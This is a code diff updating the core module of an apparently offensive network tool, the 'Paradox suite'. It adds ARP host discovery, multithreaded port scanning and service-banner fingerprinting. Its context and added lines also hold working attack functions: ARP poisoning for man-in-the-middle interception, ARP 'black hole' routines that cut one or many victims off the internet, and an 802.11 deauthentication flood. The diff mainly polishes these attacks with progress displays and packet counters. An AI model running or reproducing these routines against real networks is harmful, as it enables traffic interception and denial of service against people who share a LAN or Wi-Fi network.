@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-paradox.core — shared foundation for the Paradox suite
+paradox.core — shared foundation  ·  Paradox Tech 2026
 """
 
 from __future__ import annotations
@@ -19,16 +19,18 @@ import json
 import signal
 import ipaddress
 from dataclasses import dataclass, field
-from typing import Optional, Callable
+from typing import Optional, Callable, List
 from pathlib import Path
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 try:
     from rich.console import Console
     from rich.table import Table
     from rich.panel import Panel
     from rich.prompt import Prompt
-    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
+    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, MofNCompleteColumn, TimeElapsedColumn
+    from rich.live import Live
+    from rich.text import Text
     from rich import box
 except ImportError:
     print("[!] pip install rich")
@@ -38,82 +40,138 @@ console = Console()
 
 # ─── constants ──────────────────────────────────────────────────────────────
 
-VERSION = "3.0.0"
-SEV_WEIGHT = {"LOW": 1, "MEDIUM": 3, "HIGH": 7, "CRITICAL": 15}
+VERSION      = "4.0.0"
+BUILD        = "PARADOX-TECH-2026"
+SEV_WEIGHT   = {"LOW": 1, "MEDIUM": 3, "HIGH": 7, "CRITICAL": 15}
+SEV_COLOR    = {"LOW": "green", "MEDIUM": "yellow", "HIGH": "red", "CRITICAL": "bold red"}
+SEV_ORDER    = ("LOW", "MEDIUM", "HIGH", "CRITICAL")
 
 OUI_TABLE: dict[str, str] = {
-    "00:50:56": "VMware", "00:0c:29": "VMware", "00:50:f2": "Microsoft",
+    "00:50:56": "VMware",       "00:0c:29": "VMware",       "00:50:f2": "Microsoft",
     "b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi", "e4:5f:01": "Raspberry Pi",
-    "94:65:2d": "Apple", "f0:b4:29": "Apple", "3c:22:fb": "Apple",
-    "78:4f:43": "Apple", "00:1b:63": "Apple", "28:d2:44": "Samsung",
-    "8c:77:12": "Samsung", "00:16:3e": "Xen/AWS", "52:54:00": "QEMU/KVM",
-    "00:1c:bf": "Intel", "70:3a:51": "Intel", "18:60:24": "Huawei",
-    "d8:49:2f": "Xiaomi", "00:11:32": "Synology", "68:7f:74": "TP-Link",
-    "cc:2d:e0": "TP-Link", "00:1a:a0": "Dell", "fc:aa:14": "ASUSTek",
-    "04:d4:c4": "ASUSTek", "00:e0:4c": "Realtek", "a4:c3:f0": "Google",
-    "08:00:27": "VirtualBox", "14:91:82": "Ubiquiti", "24:a4:3c": "Ubiquiti",
-    "b4:fb:e4": "Fortinet", "00:09:0f": "Fortinet", "2c:c8:1b": "MikroTik",
-    "d4:ca:6d": "MikroTik", "1c:98:ec": "HP", "3c:d9:2b": "HP",
+    "94:65:2d": "Apple",        "f0:b4:29": "Apple",        "3c:22:fb": "Apple",
+    "78:4f:43": "Apple",        "00:1b:63": "Apple",        "28:d2:44": "Samsung",
+    "8c:77:12": "Samsung",      "00:16:3e": "Xen/AWS",      "52:54:00": "QEMU/KVM",
+    "00:1c:bf": "Intel",        "70:3a:51": "Intel",        "18:60:24": "Huawei",
+    "d8:49:2f": "Xiaomi",       "00:11:32": "Synology",     "68:7f:74": "TP-Link",
+    "cc:2d:e0": "TP-Link",      "00:1a:a0": "Dell",         "fc:aa:14": "ASUSTek",
+    "04:d4:c4": "ASUSTek",      "00:e0:4c": "Realtek",      "a4:c3:f0": "Google",
+    "08:00:27": "VirtualBox",   "14:91:82": "Ubiquiti",     "24:a4:3c": "Ubiquiti",
+    "b4:fb:e4": "Fortinet",     "00:09:0f": "Fortinet",     "2c:c8:1b": "MikroTik",
+    "d4:ca:6d": "MikroTik",     "1c:98:ec": "HP",           "3c:d9:2b": "HP",
+    "00:23:ae": "Cisco",        "00:1e:49": "Cisco",        "f8:72:ea": "Cisco",
+    "00:17:c8": "Netgear",      "20:e5:2a": "Netgear",      "84:1b:5e": "Netgear",
+    "9c:5c:8e": "Belkin",       "ec:1a:59": "Belkin",       "00:26:b9": "Dell",
+    "b0:83:fe": "Intel",        "8c:8d:28": "Intel",        "40:a3:6b": "LG",
+    "cc:4b:73": "LG",           "00:1d:7e": "Linksys",      "00:21:29": "Linksys",
 }
 
 PORT_SERVICE: dict[int, str] = {
-    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
-    80: "HTTP", 110: "POP3", 139: "NetBIOS", 143: "IMAP", 443: "HTTPS",
-    445: "SMB", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
-    5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
-    2375: "Docker-API", 27017: "MongoDB", 9200: "Elasticsearch",
+    21: "FTP",    22: "SSH",      23: "Telnet",   25: "SMTP",    53: "DNS",
+    67: "DHCP",   68: "DHCP",     69: "TFTP",     80: "HTTP",    110: "POP3",
+    119: "NNTP",  123: "NTP",     135: "MSRPC",   137: "NetBIOS",139: "NetBIOS",
+    143: "IMAP",  161: "SNMP",    179: "BGP",     389: "LDAP",   443: "HTTPS",
+    445: "SMB",   465: "SMTPS",   514: "Syslog",  515: "LPD",    587: "SMTP-S",
+    631: "IPP",   636: "LDAPS",   993: "IMAPS",   995: "POP3S",  1080: "SOCKS",
+    1194: "OpenVPN", 1433: "MSSQL", 1521: "Oracle", 1723: "PPTP", 2049: "NFS",
+    2375: "Docker",  2376: "DockerTLS", 2379: "etcd", 3000: "NodeJS", 3128: "Squid",
+    3306: "MySQL",   3389: "RDP",   4000: "NodeJS", 4443: "HTTPS-Alt", 5000: "Flask",
+    5432: "PostgreSQL", 5601: "Kibana", 5900: "VNC", 6379: "Redis", 6443: "K8s",
+    7001: "WebLogic",   8080: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "Jupyter",
+    9000: "Portainer",  9090: "Prometheus", 9200: "Elasticsearch", 9300: "ES-Cluster",
+    10250: "kubelet",   11211: "Memcached", 27017: "MongoDB",   27018: "MongoDB",
+    50070: "Hadoop",
 }
 
 COMMON_PORTS = [
     21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 1433, 1521,
-    2375, 3000, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888,
-    9000, 9200, 11211, 27017,
+    2375, 2376, 2379, 3000, 3128, 3306, 3389, 4443, 5000, 5432,
+    5601, 5900, 6379, 6443, 7001, 8080, 8443, 8888, 9000, 9090,
+    9200, 10250, 11211, 27017,
 ]
+
+# Extended banner probes — more services fingerprinted
+_BANNER_PROBES: dict[int, bytes] = {
+    21:    b"",
+    22:    b"",
+    23:    b"",
+    25:    b"EHLO paradox\r\n",
+    80:    b"GET / HTTP/1.0\r\nHost: x\r\nUser-Agent: Paradox/4.0\r\n\r\n",
+    110:   b"+OK\r\n",
+    143:   b"",
+    443:   b"",
+    445:   b"",
+    6379:  b"PING\r\n",
+    8080:  b"GET / HTTP/1.0\r\nHost: x\r\nUser-Agent: Paradox/4.0\r\n\r\n",
+    8888:  b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
+    9200:  b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
+    27017: b"\x3a\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\xff\xff\xff\xff\x1b\x00\x00\x00\x10serverStatus\x00\x01\x00\x00\x00\x00",
+}
+
 
 # ─── data models ────────────────────────────────────────────────────────────
 
 @dataclass
 class Host:
-    ip: str
-    mac: str = "unknown"
-    vendor: str = "unknown"
-    hostname: str = "unknown"
-    os_guess: str = "unknown"
-    ttl: int = 0
-    open_ports: dict = field(default_factory=dict)   # port -> banner
-    findings: list = field(default_factory=list)
-    risk_score: int = 0
-    alive: bool = True
+    ip:          str
+    mac:         str  = "unknown"
+    vendor:      str  = "unknown"
+    hostname:    str  = "unknown"
+    os_guess:    str  = "unknown"
+    ttl:         int  = 0
+    rtt_ms:      float = 0.0            # round-trip time — used for adaptive scan
+    open_ports:  dict = field(default_factory=dict)   # port -> banner str
+    services:    dict = field(default_factory=dict)   # port -> fingerprint dict
+    findings:    list = field(default_factory=list)
+    risk_score:  int  = 0
+    alive:       bool = True
+    first_seen:  float = field(default_factory=time.time)
 
     def add_finding(self, desc: str, sev: str, rem: str = "", cve: str = "") -> None:
+        # deduplicate
+        for f in self.findings:
+            if f["description"] == desc:
+                return
         self.findings.append({
             "description": desc, "severity": sev,
             "remediation": rem, "cve": cve,
         })
         self.risk_score += SEV_WEIGHT.get(sev, 0)
 
+    @property
+    def risk_label(self) -> str:
+        if self.risk_score == 0:   return "CLEAN"
+        if self.risk_score < 10:   return "LOW"
+        if self.risk_score < 30:   return "MEDIUM"
+        if self.risk_score < 60:   return "HIGH"
+        return "CRITICAL"
+
 
 @dataclass
 class NetworkInfo:
-    iface: str = ""
-    ssid: str = "unknown"
-    bssid: str = "unknown"
-    channel: int = 0
-    signal_dbm: int = 0
-    frequency: str = ""
-    encryption: str = ""
-    our_ip: str = ""
-    our_mac: str = ""
-    gateway_ip: str = ""
-    gateway_mac: str = ""
-    subnet_cidr: str = ""
+    iface:       str   = ""
+    ssid:        str   = "unknown"
+    bssid:       str   = "unknown"
+    channel:     int   = 0
+    signal_dbm:  int   = 0
+    frequency:   str   = ""
+    encryption:  str   = ""
+    our_ip:      str   = ""
+    our_mac:     str   = ""
+    gateway_ip:  str   = ""
+    gateway_mac: str   = ""
+    subnet_cidr: str   = ""
 
 
 # ─── root / env helpers ─────────────────────────────────────────────────────
 
 def require_root() -> None:
     if hasattr(os, "geteuid") and os.geteuid() != 0:
-        console.print("[bold red][!] Root required. Use: sudo python3 ...[/bold red]")
+        console.print(Panel(
+            "[bold red][!] Root privileges required.[/bold red]\n"
+            "[dim]Run:  sudo python3 paradox_netscan.py[/dim]",
+            border_style="red", expand=False,
+        ))
         sys.exit(1)
 
 
@@ -188,7 +246,6 @@ def get_gateway_ip() -> str:
 
 
 def resolve_mac(ip: str, iface: str = "") -> str:
-    """Resolve MAC via ARP (scapy preferred, then system arp)."""
     try:
         from scapy.all import getmacbyip
         mac = getmacbyip(ip)
@@ -214,33 +271,31 @@ def resolve_mac(ip: str, iface: str = "") -> str:
 
 
 def ttl_os_guess(ttl: int) -> str:
-    if ttl <= 0:
-        return "unknown"
-    if 60 <= ttl <= 65:
-        return "Linux / Android"
-    if 126 <= ttl <= 129:
-        return "Windows"
-    if 253 <= ttl <= 256:
-        return "Cisco / Network Device"
-    if ttl > 100:
-        return "Windows (NAT)"
-    if ttl > 60:
-        return "Linux (NAT)"
+    if ttl <= 0:         return "unknown"
+    if 60 <= ttl <= 65:  return "Linux / Android"
+    if 126 <= ttl <= 129: return "Windows"
+    if 253 <= ttl <= 256: return "Cisco / Network Device"
+    if ttl > 100:        return "Windows (NAT)"
+    if ttl > 60:         return "Linux (NAT)"
+    if 32 <= ttl <= 35:  return "FreeBSD / macOS"
     return f"Unknown (TTL={ttl})"
 
 
-def icmp_ttl(ip: str) -> int:
+def icmp_ttl(ip: str) -> tuple[int, float]:
+    """Returns (ttl, rtt_ms). Both 0 on failure."""
     try:
+        t0  = time.time()
         out = subprocess.check_output(
             ["ping", "-c", "1", "-W", "1", ip],
             text=True, stderr=subprocess.DEVNULL, timeout=3,
         )
-        m = re.search(r"ttl=(\d+)", out, re.I)
+        rtt = (time.time() - t0) * 1000
+        m   = re.search(r"ttl=(\d+)", out, re.I)
         if m:
-            return int(m.group(1))
+            return int(m.group(1)), round(rtt, 1)
     except Exception:
         pass
-    return 0
+    return 0, 0.0
 
 
 def resolve_hostname(ip: str) -> str:
@@ -253,10 +308,10 @@ def resolve_hostname(ip: str) -> str:
 # ─── network info ───────────────────────────────────────────────────────────
 
 def collect_network_info(iface: str) -> NetworkInfo:
-    net = NetworkInfo(iface=iface)
-    net.our_ip = get_local_ip(iface)
+    net             = NetworkInfo(iface=iface)
+    net.our_ip      = get_local_ip(iface)
     net.subnet_cidr = get_local_cidr(iface)
-    net.gateway_ip = get_gateway_ip()
+    net.gateway_ip  = get_gateway_ip()
 
     try:
         net.our_mac = Path(f"/sys/class/net/{iface}/address").read_text().strip().lower()
@@ -317,20 +372,34 @@ def collect_network_info(iface: str) -> NetworkInfo:
 
 
 def print_network_info(net: NetworkInfo) -> None:
-    t = Table(title="[bold red]Active Network[/bold red]", box=box.SIMPLE_HEAD)
-    t.add_column("Field", style="bold cyan", width=16)
-    t.add_column("Value", style="green")
+    w = console.width
+    t = Table(
+        title="[bold red]◈  Network Interface[/bold red]",
+        box=box.ROUNDED,
+        expand=(w > 100),
+        show_header=True,
+        header_style="bold dim",
+    )
+    t.add_column("Field",  style="bold cyan", width=16)
+    t.add_column("Value",  style="green")
+
+    signal_str = ""
+    if net.signal_dbm:
+        bars = "▂▄▆█"
+        idx  = min(3, max(0, (net.signal_dbm + 90) // 15))
+        signal_str = f"{net.signal_dbm} dBm  {bars[idx]}"
+
     for label, val in [
-        ("SSID", net.ssid),
-        ("BSSID (AP)", net.bssid),
-        ("Channel", str(net.channel) if net.channel else "?"),
-        ("Signal", f"{net.signal_dbm} dBm" if net.signal_dbm else "?"),
-        ("Our IP", net.our_ip),
-        ("Our MAC", net.our_mac),
-        ("Gateway IP", net.gateway_ip),
+        ("Interface",   net.iface),
+        ("SSID",        net.ssid),
+        ("BSSID",       net.bssid),
+        ("Channel",     str(net.channel) if net.channel else "?"),
+        ("Signal",      signal_str or "?"),
+        ("Our IP",      net.our_ip),
+        ("Our MAC",     net.our_mac),
+        ("Gateway IP",  net.gateway_ip),
         ("Gateway MAC", net.gateway_mac),
-        ("Subnet", net.subnet_cidr),
-        ("Interface", net.iface),
+        ("Subnet",      net.subnet_cidr),
     ]:
         t.add_row(label, val or "—")
     console.print(t)
@@ -340,76 +409,108 @@ def print_network_info(net: NetworkInfo) -> None:
 
 def arp_scan(cidr: str, iface: str, timeout: float = 2.5) -> list[Host]:
     hosts: list[Host] = []
-    console.print(f"[yellow][*] ARP scan {cidr} on {iface}...[/yellow]")
-    try:
-        from scapy.all import ARP, Ether, srp
-        ans, _ = srp(
-            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr),
-            timeout=timeout, verbose=False, iface=iface,
-        )
-        for _, rcv in ans:
-            ip = rcv.psrc
-            mac = rcv.hwsrc.lower()
-            ttl = icmp_ttl(ip)
-            hosts.append(Host(
-                ip=ip, mac=mac, vendor=get_vendor(mac),
-                hostname=resolve_hostname(ip),
-                os_guess=ttl_os_guess(ttl), ttl=ttl,
-            ))
-    except ImportError:
-        console.print("[red][!] pip install scapy[/red]")
-    except Exception as e:
-        console.print(f"[red][!] ARP scan: {e}[/red]")
+    console.print(f"[yellow][*] ARP scan  {cidr}  on  {iface}[/yellow]")
 
-    # supplement from kernel ARP cache
-    try:
-        for line in Path("/proc/net/arp").read_text().splitlines()[1:]:
-            parts = line.split()
-            if len(parts) < 4:
-                continue
-            ip, mac, flags = parts[0], parts[3].lower(), parts[2]
-            if mac in ("00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff") or flags == "0x0":
-                continue
-            if any(h.ip == ip for h in hosts):
-                continue
-            ttl = icmp_ttl(ip)
-            hosts.append(Host(
-                ip=ip, mac=mac, vendor=get_vendor(mac),
-                hostname=resolve_hostname(ip),
-                os_guess=ttl_os_guess(ttl), ttl=ttl,
-            ))
-    except Exception:
-        pass
+    with Progress(
+        SpinnerColumn(style="bold red"),
+        TextColumn("[bold white]{task.description}"),
+        TimeElapsedColumn(),
+        transient=True,
+    ) as prog:
+        tid = prog.add_task("Sending ARP requests …", total=None)
 
-    console.print(f"[green][+] {len(hosts)} hosts discovered[/green]")
+        try:
+            from scapy.all import ARP, Ether, srp
+            ans, _ = srp(
+                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr),
+                timeout=timeout, verbose=False, iface=iface,
+            )
+            prog.update(tid, description=f"Got {len(ans)} replies — resolving …")
+            for _, rcv in ans:
+                ip  = rcv.psrc
+                mac = rcv.hwsrc.lower()
+                ttl, rtt = icmp_ttl(ip)
+                hosts.append(Host(
+                    ip=ip, mac=mac, vendor=get_vendor(mac),
+                    hostname=resolve_hostname(ip),
+                    os_guess=ttl_os_guess(ttl), ttl=ttl, rtt_ms=rtt,
+                ))
+        except ImportError:
+            console.print("[red][!] pip install scapy[/red]")
+        except Exception as e:
+            console.print(f"[red][!] ARP scan: {e}[/red]")
+
+        # supplement from kernel ARP cache
+        prog.update(tid, description="Reading ARP cache …")
+        try:
+            for line in Path("/proc/net/arp").read_text().splitlines()[1:]:
+                parts = line.split()
+                if len(parts) < 4:
+                    continue
+                ip, mac, flags = parts[0], parts[3].lower(), parts[2]
+                if mac in ("00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff") or flags == "0x0":
+                    continue
+                if any(h.ip == ip for h in hosts):
+                    continue
+                ttl, rtt = icmp_ttl(ip)
+                hosts.append(Host(
+                    ip=ip, mac=mac, vendor=get_vendor(mac),
+                    hostname=resolve_hostname(ip),
+                    os_guess=ttl_os_guess(ttl), ttl=ttl, rtt_ms=rtt,
+                ))
+        except Exception:
+            pass
+
+    _color = "green" if hosts else "red"
+    console.print(f"[{_color}][+] {len(hosts)} host{'s' if len(hosts) != 1 else ''} discovered[/{_color}]")
     return hosts
 
 
-def print_hosts(hosts: list[Host], title: str = "Hosts") -> None:
-    t = Table(title=f"[bold red]{title}[/bold red]", box=box.MINIMAL_DOUBLE_HEAD)
-    t.add_column("#", style="bold cyan", width=4)
-    t.add_column("IP", style="green", width=15)
-    t.add_column("MAC", style="dim", width=18)
-    t.add_column("Vendor", style="yellow", width=14)
-    t.add_column("Hostname", style="dim", width=20)
-    t.add_column("OS", style="magenta", width=16)
-    t.add_column("Ports", style="red", width=16)
-    t.add_column("Risk", style="bold red", justify="right", width=5)
+def print_hosts(hosts: list[Host], title: str = "Live Hosts") -> None:
+    w = console.width
+
+    t = Table(
+        title=f"[bold red]◈  {title}[/bold red]",
+        box=box.ROUNDED,
+        expand=(w > 100),
+        show_header=True,
+        header_style="bold dim red",
+        row_styles=["", "dim"],
+    )
+    t.add_column("#",        style="bold cyan",    width=4,  justify="right")
+    t.add_column("IP",       style="bold green",   width=16)
+    t.add_column("MAC",      style="dim",          width=18)
+    t.add_column("Vendor",   style="yellow",       width=14)
+
+    if w > 110:
+        t.add_column("Hostname", style="dim white", width=22)
+        t.add_column("OS",       style="magenta",   width=18)
+        t.add_column("RTT",      style="dim cyan",  width=8, justify="right")
+
+    t.add_column("Ports",    style="red",          width=18)
+    t.add_column("Risk",     style="bold",         width=9, justify="right")
+
     for i, h in enumerate(hosts, 1):
-        ports = ",".join(str(p) for p in sorted(h.open_ports)[:5]) or "—"
-        t.add_row(
-            str(i), h.ip, h.mac, h.vendor[:13],
-            h.hostname[:19], h.os_guess[:15], ports, str(h.risk_score),
-        )
+        ports = ",".join(str(p) for p in sorted(h.open_ports)[:6]) or "—"
+        rc    = SEV_COLOR.get(h.risk_label, "dim")
+        risk  = f"[{rc}]{h.risk_label}[/{rc}]" if h.risk_score else "[dim]CLEAN[/dim]"
+
+        row = [str(i), h.ip, h.mac, h.vendor[:13]]
+        if w > 110:
+            rtt_str = f"{h.rtt_ms:.1f}ms" if h.rtt_ms else "—"
+            row += [h.hostname[:21], h.os_guess[:17], rtt_str]
+        row += [ports, risk]
+        t.add_row(*row)
+
     console.print(t)
 
 
 def select_host(hosts: list[Host]) -> Optional[Host]:
     if not hosts:
-        console.print("[red]No hosts. Run discovery first.[/red]")
+        console.print("[red]No hosts discovered yet. Run a scan first.[/red]")
         return None
     print_hosts(hosts)
-    raw = Prompt.ask("Select host # (0=cancel)", default="0")
+    raw = Prompt.ask("[bold cyan]Select host #[/bold cyan]  (0 = cancel)", default="0")
     try:
         idx = int(raw) - 1
         if 0 <= idx < len(hosts):
@@ -419,54 +520,113 @@ def select_host(hosts: list[Host]) -> Optional[Host]:
     return None
 
 
-# ─── port scan ──────────────────────────────────────────────────────────────
+# ─── port scan — adaptive threading based on host RTT ───────────────────────
 
-def grab_banner(ip: str, port: int, timeout: float = 2.0) -> str:
-    probes = {
-        80: b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
-        8080: b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
-        443: b"",
-        22: b"",
-        21: b"",
-        6379: b"PING\r\n",
-    }
+def grab_banner(ip: str, port: int, timeout: float = 2.5) -> str:
+    probe = _BANNER_PROBES.get(port, b"")
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(timeout)
         s.connect((ip, port))
-        probe = probes.get(port, b"")
         if probe:
             s.sendall(probe)
         else:
-            time.sleep(0.2)
-        data = s.recv(1024).decode("utf-8", errors="ignore").strip()
+            time.sleep(0.3)
+        data = s.recv(2048).decode("utf-8", errors="ignore").strip()
         s.close()
-        return data[:120]
+        return data[:200]
     except Exception:
         return ""
 
 
-def scan_ports(host: Host, ports: list[int] | None = None, workers: int = 20) -> None:
+def _fingerprint_service(port: int, banner: str) -> dict:
+    """Extract structured info from a banner."""
+    info: dict = {"port": port, "service": PORT_SERVICE.get(port, "?"), "banner": banner}
+
+    # HTTP version / server header
+    m = re.search(r"Server:\s*(.+)", banner, re.I)
+    if m:
+        info["server"] = m.group(1).strip()
+
+    # SSH version
+    m = re.search(r"SSH-[\d.]+-(\S+)", banner)
+    if m:
+        info["ssh_version"] = m.group(1)
+
+    # Redis
+    if "+PONG" in banner:
+        info["redis_unauth"] = True
+
+    # Elasticsearch
+    if '"cluster_name"' in banner:
+        m = re.search(r'"number"\s*:\s*"([^"]+)"', banner)
+        if m:
+            info["es_version"] = m.group(1)
+
+    # FTP
+    m = re.search(r"220[- ](.+)", banner)
+    if m:
+        info["ftp_banner"] = m.group(1).strip()[:60]
+
+    return info
+
+
+def scan_ports(host: Host, ports: list[int] | None = None, workers: int | None = None) -> None:
     if ports is None:
         ports = COMMON_PORTS
-    console.print(f"[yellow][*] Port scan {host.ip} ({len(ports)} ports)...[/yellow]")
+
+    # adaptive workers: fast hosts get more parallelism
+    if workers is None:
+        workers = 100 if host.rtt_ms < 5 else (50 if host.rtt_ms < 20 else 20)
+
+    console.print(f"[yellow][*] Scanning [bold]{host.ip}[/bold]  {len(ports)} ports  {workers} threads[/yellow]")
+
+    found   = []
+    done    = [0]
+    total   = len(ports)
+    lock    = threading.Lock()
 
     def _check(port: int) -> None:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.7)
+            s.settimeout(0.8)
             if s.connect_ex((host.ip, port)) == 0:
                 s.close()
                 banner = grab_banner(host.ip, port)
-                host.open_ports[port] = banner
-                console.print(f"[green]   OPEN {port}/{PORT_SERVICE.get(port, '?')}  {banner[:50]}[/green]")
+                fp     = _fingerprint_service(port, banner)
+                with lock:
+                    host.open_ports[port]  = banner
+                    host.services[port]    = fp
+                    found.append(port)
             else:
                 s.close()
         except Exception:
             pass
+        finally:
+            with lock:
+                done[0] += 1
 
-    with ThreadPoolExecutor(max_workers=workers) as pool:
-        pool.map(_check, ports)
+    with Progress(
+        SpinnerColumn(style="red"),
+        TextColumn("[bold white]{task.description}"),
+        BarColumn(bar_width=30, style="dim red", complete_style="red"),
+        MofNCompleteColumn(),
+        TimeElapsedColumn(),
+        transient=True,
+    ) as prog:
+        tid = prog.add_task(f"Port scan {host.ip}", total=total)
+        with ThreadPoolExecutor(max_workers=workers) as pool:
+            futures = {pool.submit(_check, p): p for p in ports}
+            for _ in as_completed(futures):
+                prog.update(tid, advance=1)
+
+    if found:
+        for p in sorted(found):
+            svc = PORT_SERVICE.get(p, "?")
+            bn  = host.open_ports[p][:60]
+            console.print(f"  [bold green]OPEN[/bold green]  [cyan]{p:5d}[/cyan]  [yellow]{svc:<14}[/yellow]  [dim]{bn}[/dim]")
+    else:
+        console.print("  [dim]No open ports found in scanned range.[/dim]")
 
 
 # ─── attack primitives ──────────────────────────────────────────────────────
@@ -480,9 +640,9 @@ def arp_poison(victim_ip: str, gateway_ip: str, iface: str) -> None:
         console.print("[red]pip install scapy[/red]")
         return
 
-    victim_mac = resolve_mac(victim_ip, iface)
+    victim_mac  = resolve_mac(victim_ip, iface)
     gateway_mac = resolve_mac(gateway_ip, iface)
-    our_mac = get_if_hwaddr(iface)
+    our_mac     = get_if_hwaddr(iface)
 
     if victim_mac == "unknown" or gateway_mac == "unknown":
         console.print("[red][-] MAC resolution failed[/red]")
@@ -510,8 +670,7 @@ def arp_poison(victim_ip: str, gateway_ip: str, iface: str) -> None:
                 pass
             time.sleep(1.5)
 
-    t = threading.Thread(target=_loop, daemon=True)
-    t.start()
+    threading.Thread(target=_loop, daemon=True).start()
     console.print("[green][+] MITM active. Ctrl-C to stop + restore.[/green]")
     try:
         while True:
@@ -536,7 +695,6 @@ def arp_poison(victim_ip: str, gateway_ip: str, iface: str) -> None:
 
 
 def arp_blackhole(victim_ip: str, gateway_ip: str, iface: str, duration: int = 0) -> None:
-    """Cut victim internet by poisoning gateway MAC to a dead address. No monitor mode needed."""
     console.print(f"[bold red][*] ARP Black Hole → {victim_ip}[/bold red]")
     try:
         from scapy.all import ARP, Ether, sendp
@@ -549,33 +707,39 @@ def arp_blackhole(victim_ip: str, gateway_ip: str, iface: str, duration: int = 0
         console.print(f"[red][-] Cannot resolve MAC for {victim_ip}[/red]")
         return
 
-    dead = "de:ad:00:00:be:ef"
-    poison = Ether(dst=victim_mac, src=dead) / ARP(
+    dead    = "de:ad:00:00:be:ef"
+    poison  = Ether(dst=victim_mac, src=dead) / ARP(
         op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=dead
     )
-    stop = threading.Event()
-    start = time.time()
+    stop    = threading.Event()
+    start   = time.time()
+    sent    = [0]
 
     def _loop() -> None:
         while not stop.is_set():
             try:
                 sendp(poison, iface=iface, verbose=False)
+                sent[0] += 1
             except Exception:
                 pass
             if duration and (time.time() - start) >= duration:
                 stop.set()
-            time.sleep(1.0)
+            time.sleep(0.8)
 
-    t = threading.Thread(target=_loop, daemon=True)
-    t.start()
+    threading.Thread(target=_loop, daemon=True).start()
     console.print("[green][+] Internet cut. Ctrl-C to restore.[/green]")
     try:
         while not stop.is_set():
+            elapsed = time.time() - start
+            console.print(
+                f"[dim]  poison pkts: {sent[0]}  elapsed: {elapsed:.0f}s[/dim]", end="\r"
+            )
             time.sleep(0.5)
     except KeyboardInterrupt:
         pass
     finally:
         stop.set()
+        console.print()
         real_gw = resolve_mac(gateway_ip, iface)
         if real_gw != "unknown":
             restore = Ether(dst=victim_mac, src=real_gw) / ARP(
@@ -589,7 +753,6 @@ def arp_blackhole(victim_ip: str, gateway_ip: str, iface: str, duration: int = 0
 
 
 def mass_arp_blackhole(targets: list[Host], gateway_ip: str, iface: str) -> None:
-    """Black-hole every target at once."""
     console.print(f"[bold red][*] Mass ARP Black Hole — {len(targets)} clients[/bold red]")
     try:
         from scapy.all import ARP, Ether, sendp
@@ -598,42 +761,40 @@ def mass_arp_blackhole(targets: list[Host], gateway_ip: str, iface: str) -> None
         return
 
     dead = "de:ad:00:00:be:ef"
-    pkts = []
-    for c in targets:
-        if c.mac == "unknown":
-            continue
-        pkts.append(
-            Ether(dst=c.mac, src=dead) / ARP(
-                op=2, pdst=c.ip, hwdst=c.mac, psrc=gateway_ip, hwsrc=dead
-            )
+    pkts = [
+        Ether(dst=c.mac, src=dead) / ARP(
+            op=2, pdst=c.ip, hwdst=c.mac, psrc=gateway_ip, hwsrc=dead
         )
+        for c in targets if c.mac != "unknown"
+    ]
     if not pkts:
-        console.print("[red]No valid MACs to poison.[/red]")
+        console.print("[red]No valid MACs.[/red]")
         return
 
-    stop = threading.Event()
+    stop  = threading.Event()
+    sent  = [0]
 
     def _loop() -> None:
         while not stop.is_set():
             try:
                 sendp(pkts, iface=iface, verbose=False)
+                sent[0] += len(pkts)
             except Exception:
                 pass
             time.sleep(1.0)
 
-    t = threading.Thread(target=_loop, daemon=True)
-    t.start()
+    threading.Thread(target=_loop, daemon=True).start()
     console.print(f"[green][+] {len(pkts)} clients cut. Ctrl-C to stop.[/green]")
     try:
         while True:
+            console.print(f"[dim]  poison cycles: {sent[0]}[/dim]", end="\r")
             time.sleep(0.5)
     except KeyboardInterrupt:
         stop.set()
-        console.print("[yellow][*] Stopped. ARP tables will age out / restore on next real traffic.[/yellow]")
+    console.print("\n[yellow][*] Stopped. Tables restore on next real traffic.[/yellow]")
 
 
 def deauth_flood(iface: str, bssid: str, client_mac: str = "ff:ff:ff:ff:ff:ff", count: int = 0) -> None:
-    """802.11 deauth. Requires monitor mode."""
     console.print(f"[bold red][*] Deauth → AP {bssid}  client {client_mac}[/bold red]")
     try:
         from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
@@ -646,8 +807,9 @@ def deauth_flood(iface: str, bssid: str, client_mac: str = "ff:ff:ff:ff:ff:ff", 
         / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid)
         / Dot11Deauth(reason=7)
     )
-    stop = threading.Event()
-    sent = [0]
+    stop  = threading.Event()
+    sent  = [0]
+    start = time.time()
 
     def _loop() -> None:
         while not stop.is_set():
@@ -662,25 +824,33 @@ def deauth_flood(iface: str, bssid: str, client_mac: str = "ff:ff:ff:ff:ff:ff", 
                 pass
             time.sleep(0.05)
 
-    t = threading.Thread(target=_loop, daemon=True)
-    t.start()
-    console.print("[green][+] Deauth running. Ctrl-C to stop.[/green]")
-    try:
-        while not stop.is_set():
-            time.sleep(0.5)
-            console.print(f"[dim]   frames: {sent[0]}[/dim]", end="\r")
-    except KeyboardInterrupt:
-        stop.set()
